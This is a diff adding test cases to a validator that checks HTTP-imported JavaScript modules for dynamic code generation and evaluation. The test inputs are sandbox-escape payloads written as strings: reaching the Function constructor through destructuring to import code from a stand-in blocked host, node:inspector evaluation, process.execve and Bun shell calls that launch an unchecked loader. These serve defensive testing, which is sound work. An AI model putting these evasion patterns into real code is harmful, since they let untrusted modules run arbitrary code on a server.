@@ -1009,6 +1009,56 @@ describe("routing/api/module-loader/http-validator", () => {
       }
     });
 
+    it("should reject constructor keys destructured from function parameters", async () => {
+      for (
+        const source of [
+          `(function ({ constructor: make }) {` +
+          ` make('return import("https://blocked.example/mod.js")')();` +
+          `})(() => {});`,
+          `(function ({ constructor: make = undefined }) {` +
+          ` make('return import("https://blocked.example/mod.js")')();` +
+          `})(() => {});`,
+          `(function ({ nested: { constructor: make } }) {` +
+          ` make('return import("https://blocked.example/mod.js")')();` +
+          `})({ nested: () => {} });`,
+          `const key = "constructor"; (function ({ [key]: make }) {` +
+          ` make('return import("https://blocked.example/mod.js")')();` +
+          `})(() => {});`,
+          `try { throw () => {}; } catch ({ constructor: make }) {` +
+          ` make('return import("https://blocked.example/mod.js")')(); }`,
+          `for (const { constructor: make } of [() => {}]) {` +
+          ` make('return import("https://blocked.example/mod.js")')(); }`,
+          `const { nested: { constructor: make } } = { nested: () => {} };` +
+          ` make('return import("https://blocked.example/mod.js")')();`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "a parameter pattern can obtain Function through a callable argument",
+        );
+      }
+      await validateHTTPImports(`function read({ value }) { return value; }`, []);
+    });
+
+    it("should reject descriptor aliases destructured from unknown parameters", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `function run({ getOwnPropertyDescriptor: get }) {` +
+              ` const make = get(Object.getPrototypeOf(() => {}),` +
+              ` "cons" + "tructor").value;` +
+              ` make('return import("https://blocked.example/mod.js")')();` +
+              ` } run(Object);`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an unknown parameter can expose a descriptor reader",
+      );
+    });
+
     it("should allow reflective reads that cannot expose a code generator", async () => {
       await validateHTTPImports(
         `const value = Reflect.get(someObject, "value"); export const GET = () => value;`,
@@ -1248,6 +1298,49 @@ describe("routing/api/module-loader/http-validator", () => {
         "code evaluation",
         "a dynamic import reaches the same evaluator",
       );
+      for (
+        const moduleName of [
+          "inspector",
+          "inspector/promises",
+          "node:inspector",
+          "node:inspector/promises",
+        ]
+      ) {
+        await assertRejects(
+          async () =>
+            await validateHTTPImports(
+              `import { Session } from "${moduleName}";` +
+                ` const session = new Session();` +
+                ` session.post("Runtime.evaluate", { expression: "eval(source)" });`,
+              [],
+            ),
+          Error,
+          "code evaluation",
+          `${moduleName} evaluates strings in the server process`,
+        );
+        await assertRejects(
+          async () => await validateHTTPImports(`await import("${moduleName}");`, []),
+          Error,
+          "code evaluation",
+          `a dynamic ${moduleName} import reaches the same evaluator`,
+        );
+        await assertRejects(
+          async () => await validateHTTPImports(`require("${moduleName}");`, []),
+          Error,
+          "code evaluation",
+          `a CommonJS ${moduleName} load reaches the same evaluator`,
+        );
+        await assertRejects(
+          async () =>
+            await validateHTTPImports(
+              `process.getBuiltinModule("${moduleName}");`,
+              [],
+            ),
+          Error,
+          "dynamic code generation",
+          `process.getBuiltinModule can recover ${moduleName}`,
+        );
+      }
     });
 
     it("should reject imports of runtime module loaders such as createRequire", async () => {
@@ -1402,6 +1495,66 @@ describe("routing/api/module-loader/http-validator", () => {
           `Bun.${method} can execute an unchecked module loader`,
         );
       }
+      for (
+        const source of [
+          `process.execve(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
+          `const run = process.execve;` +
+          ` run(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
+          `const { execve: run } = process;` +
+          ` run(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
+          `process.execve.call(process, process.execPath,` +
+          ` [process.execPath, "./unchecked.cjs"], process.env);`,
+          `process.execve.apply(process,` +
+          ` [process.execPath, [process.execPath, "./unchecked.cjs"], process.env]);`,
+          `process.execve.bind(process)(process.execPath,` +
+          ` [process.execPath, "./unchecked.cjs"], process.env);`,
+          `Reflect.apply(process.execve, process,` +
+          ` [process.execPath, [process.execPath, "./unchecked.cjs"], process.env]);`,
+          `export const run = process.execve;`,
+          `import process from "node:process";` +
+          ` process.execve(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
+          `import * as processModule from "process";` +
+          ` processModule.execve(processModule.execPath,` +
+          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
+          `import { execve as run, execPath, env } from "node:process";` +
+          ` run(execPath, [execPath, "./unchecked.cjs"], env);`,
+          `const processModule = await import("node:process");` +
+          ` processModule.execve(processModule.execPath,` +
+          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
+          `const processModule = require("node:process");` +
+          ` processModule.execve(processModule.execPath,` +
+          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
+          `const processModule = process.getBuiltinModule("node:process");` +
+          ` processModule.execve(processModule.execPath,` +
+          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
+          `import processModule = require("node:process");` +
+          ` processModule.execve(processModule.execPath,` +
+          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "process.execve can replace the server with an unchecked module loader",
+        );
+      }
+      for (
+        const source of [
+          "Bun.$`${process.execPath} ./unchecked.ts`;",
+          "const shell = Bun.$; shell`${process.execPath} ./unchecked.ts`;",
+          "const { $: shell } = Bun; shell`${process.execPath} ./unchecked.ts`;",
+          "Bun.$.bind(Bun)`${process.execPath} ./unchecked.ts`;",
+          "export const shell = Bun.$;",
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "Bun shell tags can execute an unchecked module loader",
+        );
+      }
       await assertRejects(
         async () => await validateHTTPImports(`export const RouteWorker = Worker;`, []),
         Error,
@@ -1431,6 +1584,27 @@ describe("routing/api/module-loader/http-validator", () => {
         Error,
         "Worker",
         "a declare binding is erased and cannot shadow the global Worker constructor",
+      );
+      await validateHTTPImports(`import type { Session } from "node:inspector";`, []);
+    });
+
+    it("should ignore locally shadowed subprocess capability names", async () => {
+      await validateHTTPImports(
+        `const process = { execve() { return "local"; } }; process.execve();`,
+        [],
+      );
+      await validateHTTPImports(
+        'const Bun = { $() { return "local"; } }; Bun.$`ordinary text`;',
+        [],
+      );
+      await validateHTTPImports(
+        `import process from "node:process";` +
+          ` export const cwd = process.cwd(); export const mode = process.env.NODE_ENV;`,
+        [],
+      );
+      await validateHTTPImports(
+        `import processModule = require("node:process"); export const cwd = processModule.cwd();`,
+        [],
       );
     });
 
